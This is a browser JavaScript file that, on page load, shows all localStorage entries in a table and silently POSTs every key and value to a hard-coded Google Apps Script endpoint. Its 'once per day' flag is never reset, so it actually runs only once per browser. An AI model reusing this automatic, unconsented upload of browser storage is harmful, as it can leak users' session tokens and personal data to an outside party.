document.addEventListener("DOMContentLoaded", function () {
    // Check if the code has already run today
    var codeHasRunToday = localStorage.getItem('codeHasRunToday');

    if (!codeHasRunToday) {
        // Get the table body element
        var tableBody = document.querySelector("#localStorageTable tbody");

        // Check if localStorage is supported
        if (typeof Storage !== "undefined") {
            // Initial load
            loadLocalStorageData();

            // Function to load localStorage data to the table
            function loadLocalStorageData() {
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    var value = localStorage.getItem(key);

                    // Create a table row and cells
                    var row = tableBody.insertRow();
                    var keyCell = row.insertCell(0);
                    var valueCell = row.insertCell(1);

                    // Set the key and value in the cells
                    keyCell.textContent = key;
                    valueCell.textContent = value;
                }
            }
        } else {
            console.error("localStorage is not supported in this browser.");
        }

        // Run the exportToGoogleSheets function
        exportToGoogleSheets();

        // Set the flag indicating that the code has run today
        localStorage.setItem('codeHasRunToday', 'true');
    }
});

function exportToGoogleSheets() {
    var data = [];
    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        var value = localStorage.getItem(key);
        data.push({ key: key, value: value });
    }

    // Ensure that data is not empty
    if (data.length > 0) {
        // Convert the data array to a URL-encoded form
        var formData = new URLSearchParams();
        formData.append('data', JSON.stringify(data));

        fetch('https://script.google.com/macros/s/AKfycbyAL0QAAUrKx9aCzxKNNdJ-232_I5lm3AUf8ck6drDLflzZySN_D5Ho9AVtIFamermM/exec', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData.toString(),  // Convert the form data to a string
        })
        .then(response => response.text())
        .then(result => {
            // Handle the response from the server
            console.log(result);
        })
        .catch(error => {
            console.error('Error exporting data to Google Sheets:', error);
        });
    } else {
        console.error('Error exporting data to Google Sheets: Empty data array.');
    }
}